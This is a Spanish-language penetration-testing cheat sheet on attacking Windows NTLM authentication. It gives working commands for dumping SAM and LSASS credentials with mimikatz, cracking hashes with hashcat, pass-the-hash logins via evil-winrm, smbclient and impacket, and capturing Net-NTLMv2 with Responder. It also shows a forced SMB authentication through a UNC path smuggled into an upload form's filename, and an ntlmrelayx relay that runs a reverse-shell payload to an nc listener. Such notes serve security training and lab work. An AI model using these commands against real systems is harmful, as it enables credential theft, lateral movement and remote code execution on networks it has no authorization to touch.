# NTLM & NTLMv2

## NTLM

El hash NTLM es el hash de la contraseña de una cuenta de Windows. Podemos obtenerlo de distintas ubicaciones, como la SAM o la memoria de LSASS.

### Obtención de hashes

#### Mimikatz

**SAM**

> **mimikatz: Activar privilegio de debug (`SeDebugPrivilege`)**

```powershell
mimikatz> privilege::debug
```

***

> **mimikatz: Obtener token de SYSTEM**

```powershell
mimikatz> token::elevate
```

***

> **mimikatz: Extraer hashes NTLM de SAM**

```powershell
mimikatz> lsadump::sam
```

Extrae los hashes NTLM de las cuentas locales almacenadas en la base de datos SAM.

#### LSASS

> **mimikatz: Extraer credenciales almacenadas en LSASS**

```powershell
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords
```

LSASS almacena material de autenticación de las sesiones iniciadas. Dependiendo del sistema y de las sesiones activas, podemos obtener hashes NTLM, contraseñas en texto claro u otras credenciales.

También podemos utilizar:

```powershell
mimikatz> sekurlsa::msv
```

Muestra específicamente información del paquete de autenticación MSV, incluyendo hashes NTLM disponibles.

***

### Crackear hash NTLM

> **hashcat: Crackear hash NTLM**

```bash
hashcat -m 1000 hash.txt <wordlist_path> -r <rule_path>
```

**Examples:**

* Wordlist: `/usr/share/wordlists/rockyou.txt`
* Rule: `/usr/share/hashcat/rules/best66.rule`

`-m 1000` corresponde al módulo NTLM.

El hash NTLM normalmente se presenta como una cadena hexadecimal de 32 caracteres. No debe confundirse con el formato de respuesta Net-NTLMv2.

***

### Pass-The-Hash

Consiste en utilizar directamente un hash NTLM para autenticarnos contra un servicio sin necesidad de conocer la contraseña en texto claro.

#### WinRM

```bash
evil-winrm -i <IP> -u <User> -H <NTHASH>
```

#### SMB

```bash
smbclient //<IP>/<share> -U '<User>%<NTHASH>' --pw-nt-hash
```

#### PsExec

```bash
impacket-psexec -hashes :<NTHASH> <DOMAIN>/<User>@<IP>
```

#### WMI

```bash
impacket-wmiexec -hashes :<NTHASH> <DOMAIN>/<User>@<IP>
```

Impacket permite especificar los hashes en formato `LMHash:NTHash`. Si únicamente disponemos del hash NTLM, dejamos vacío el campo LM (`:<NTHASH>`).

***

## Net-NTLMv2

Net-NTLMv2 es un mecanismo de autenticación basado en desafío-respuesta (Challenge-Response). A diferencia de NTLM, no obtenemos directamente el hash de la contraseña, sino una respuesta criptográfica que podemos intentar crackear.

### Captura de hashes

#### Responder

> **Desplegar Responder**

```bash
sudo responder -I tun0
```

Responder permite interceptar solicitudes de autenticación mediante protocolos como LLMNR, NBT-NS y otros servicios de red, obteniendo respuestas Net-NTLMv2 cuando un equipo intenta autenticarse contra nosotros.

***

> **Forzar autenticación para recibir el hash**

Desde la máquina víctima:

```powershell
dir \\<LOCAL-IP>\test
```

Al intentar acceder al recurso compartido, Windows intenta autenticarse contra nuestra máquina, permitiendo capturar la respuesta Net-NTLMv2 con Responder.

***

### Crackear Net-NTLMv2

> **hashcat: Crackear hash Net-NTLMv2**

```bash
hashcat -m 5600 <hash_path> <wordlist_path>
```

El módulo 5600 corresponde a Net-NTLMv2. Podemos utilizar reglas de mutación de la misma manera que con otros tipos de hash.

***

### Captura mediante formularios de subida de archivos

En algunos formularios de subida de archivos podemos modificar el nombre del archivo para introducir una ruta UNC hacia nuestro equipo.

Si la aplicación interpreta esa ruta y el servidor Windows intenta acceder al recurso compartido, podemos provocar una autenticación SMB y capturar el hash Net-NTLMv2 con Responder.

> **Desplegar Responder**

```bash
sudo responder -I tun0
```

> **Ejemplo formulario de archivo** (Obtener HASH mediante formulario de subida de archivo)

```http
------geckoformboundaryef5f9a56b08c4463fd34bba92c02301e

Content-Disposition: form-data; name="myFile"; filename="\\192.168.45.201\test\a"

Content-Type: application/x-php
```

La ruta UNC debe ser interpretada por el servidor como una ruta de red. No todos los formularios permiten este comportamiento: depende de cómo la aplicación procese y almacene el archivo.

***

### NTLM Relay

Consiste en reenviar una autenticación NTLM recibida hacia otro servicio o sistema, utilizando las credenciales de la víctima sin necesidad de crackear el hash.

> **impacket: Configurar NTLM Relay**

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t smb://<IP> -c "<PAYLOAD_REVERSE_SHELL>"
```

* `--no-http-server` deshabilita el servidor HTTP de ntlmrelayx.
* `-smb2support` habilita soporte SMB2.
* `-t` especifica el objetivo al que reenviar la autenticación.
* `-c` ejecuta un comando en el sistema objetivo después de una autenticación satisfactoria.

***

> **Poner puerto en escucha para recibir Reverse Shell**

```bash
nc -lvnp 9999
```

***

> **En la máquina víctima**

```powershell
dir \\<LOCAL-IP>\test
```

Al intentar acceder al recurso compartido, la máquina víctima intenta autenticarse contra nuestro servidor SMB de ntlmrelayx. Si la autenticación puede reenviarse correctamente al objetivo, se ejecutará el comando especificado.

**Condiciones importantes:**

* El objetivo debe aceptar autenticación NTLM.
* Para el relay SMB tradicional, el objetivo no debe exigir SMB Signing.
* La cuenta autenticada debe tener permisos suficientes en el objetivo. Para ejecutar comandos mediante SMB normalmente necesitaremos privilegios administrativos.
* Si utilizamos Responder para envenenar consultas de red junto con ntlmrelayx, debemos deshabilitar los servidores SMB y HTTP de Responder (`SMB = Off` y `HTTP = Off`) para evitar conflictos de puertos.
